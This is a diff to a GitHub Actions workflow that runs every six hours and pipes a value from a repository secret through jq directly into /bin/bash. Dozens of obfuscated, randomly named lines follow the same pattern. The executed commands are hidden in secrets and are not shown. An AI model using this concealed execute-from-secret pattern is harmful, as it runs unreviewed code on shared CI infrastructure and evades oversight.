@@ -1,8 +1,9 @@
 name: chenzhishi4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '58 1/6 * * *'
 
 jobs:
   build:
@@ -12,17 +13,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenzhishi4567
         env:
-          d28: ${{ secrets.d28 }}
+          zdln189: ${{ secrets.zdln189 }}
         run: |
-          echo $d28 | jq -r .qlund009 | /bin/bash
-          echo $vil8314 | jq -r .tjx75 | /bin/bash
-          echo $aqw73358 | jq -r .wtg700 | /bin/bash
-          echo $bmdkh5239 | jq -r .jjp264 | /bin/bash
-          echo $mfi320 | jq -r .kyj5 | /bin/bash
-          echo $qkcj5 | jq -r .dryme91195 | /bin/bash
-          echo $xrwqg72 | jq -r .x97 | /bin/bash
-          echo $hg791 | jq -r .buro755 | /bin/bash
-          echo $dlt70783 | jq -r .hcino09084 | /bin/bash
-          echo $bvgra29 | jq -r .zhfm7 | /bin/bash
-          echo $g6 | jq -r .rkys96 | /bin/bash
+          echo $zdln189 | jq -r .kokd399 | /bin/bash
+          echo $sgn18463 | jq -r .iqyz46 | /bin/bash
+          echo $yg1 | jq -r .gs307 | /bin/bash
+          echo $ww286 | jq -r .wob31 | /bin/bash
+          echo $kzaes6643 | jq -r .dtuxc4387 | /bin/bash
+          echo $iss313 | jq -r .tzwo811 | /bin/bash
+          echo $lsskc054 | jq -r .dsi01502 | /bin/bash
+          echo $asgk5 | jq -r .taer05577 | /bin/bash
+          echo $xehr4 | jq -r .wum76 | /bin/bash
+          echo $zi92 | jq -r .zs6614 | /bin/bash
+          echo $as4 | jq -r .mv3879 | /bin/bash
+          echo $hqliw2799 | jq -r .bmsq965 | /bin/bash
+          echo $r4565 | jq -r .itg5 | /bin/bash
+          echo $hqk8 | jq -r .aimk61637 | /bin/bash
+          echo $jpz23908 | jq -r .tg181 | /bin/bash
+          echo $wzom25 | jq -r .pn2 | /bin/bash
+          echo $axlbw16221 | jq -r .kc0 | /bin/bash
+          echo $szf848 | jq -r .ogb187 | /bin/bash
 
